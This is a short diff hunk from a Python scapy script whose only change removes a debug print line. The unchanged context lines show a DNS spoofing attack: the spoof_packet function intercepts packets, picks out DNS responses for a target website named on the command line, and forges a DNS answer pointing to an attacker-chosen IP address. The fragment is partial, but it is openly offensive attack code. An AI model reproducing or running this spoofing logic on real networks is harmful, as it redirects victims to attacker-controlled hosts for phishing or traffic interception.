@@ -17,7 +17,6 @@ def spoof_packet(packet):
     options = get_arguments()
     dns_packet = scapy.IP(packet.get_payload())
     if dns_packet.haslayer(scapy.DNSRR):
-        print(dns_packet.show())
         qname = dns_packet[scapy.DNSQR].qname
         if options.website in qname:
             dns_responce = scapy.DNSRR(rrname=qname, rdata=options.ip)
